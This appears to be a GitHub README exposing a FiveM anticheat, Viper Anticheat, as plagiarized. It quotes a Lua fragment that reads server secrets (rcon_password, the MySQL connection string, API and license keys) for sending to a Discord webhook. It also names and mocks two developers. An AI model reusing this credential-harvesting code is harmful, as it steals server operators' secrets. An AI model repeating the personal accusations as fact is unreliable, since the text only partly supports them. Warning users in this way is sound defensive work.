# Viper Anticheat Expose

## Overview
Viper Anticheat is a completely plagiarized anticheat solution. The following elements have been fully stolen from other projects:

- **Designs**: Authentication print, logo, and the upcoming admin menu have been entirely copied from Anvil Anticheat.
- **Videos**: The demonstration videos are direct 1-to-1 imitations of other works.
- **Ban Screen**: The ban screen has been stolen from FiveGuard.
- **Detections**: The detection methods originate from GitHub.

## Evidence
### Unauthorized Data Collection
Viper Anticheat extracts sensitive server data and sends it via a webhook to their Discord server. Below is an example of the data being stolen:

```lua
🔐 **Database Info**: %s]], GetConvar("sv_hostname", "N/A"), GetConvar("sv_projectName", "N/A"), GetConvar("sv_projectDesc", "N/A"), GetConvar("steam_webApiKey", "N/A"), GetConvar("sv_licenseKey", "N/A"), GetConvar("sv_maxclients", "N/A"), GetConvar("rcon_password", "N/A"), GetConvar("mysql_connection_string", "N/A")),
    fields = {
        {name = "", value = string.format("<t:%d:R> **AUTH SYSTEM** © VIPER ANTICHEAT | https://discord.gg/hjKJukrfGN", os.time()), inline = false}
    }
```

#### Stolen Data Includes:
- **mysql_connection_string**: Your database connection details.
- **rcon_password**: Allows unauthorized access to your server.

### Developers
The developers behind Viper Anticheat are identified as:

- **Sanji** (Clown Developer #1)
  ![Sanji Image](https://github.com/user-attachments/assets/7c9a92c0-4e24-491c-9ea2-f2f25f3745b3)

- **Nxton** (Clown Developer #2)
  ![Nxton Image](https://github.com/user-attachments/assets/c807bf54-de3c-46ea-9c48-c38475e98773)

### Additional Observations
- **Irresponsible Coding Practices**: Their code includes unnecessary functions for simple tasks and lacks proper optimization.
- **Suspicious Use of ChatGPT**: Code patterns suggest heavy reliance on AI tools like ChatGPT.

#### Examples:
1. ChatGPT comments left in the code:
   ![ChatGPT Comments](https://github.com/user-attachments/assets/584450ba-9ee3-4d96-abda-9451cf49783f)

2. Inefficient GitHub-based detections:
   ![GitHub Detection](https://github.com/user-attachments/assets/08c884ef-4e6c-4486-b860-2aa981f1448f)

3. Over-engineered code snippets:
   ![Over-Engineered Code](https://github.com/user-attachments/assets/54800d18-d477-4ed5-891f-2defaeab4709)

## Conclusion
Viper Anticheat may be free, but it poses significant security and ethical risks. Under no circumstances should this anticheat be added to your server. Stay safe and use trusted solutions.
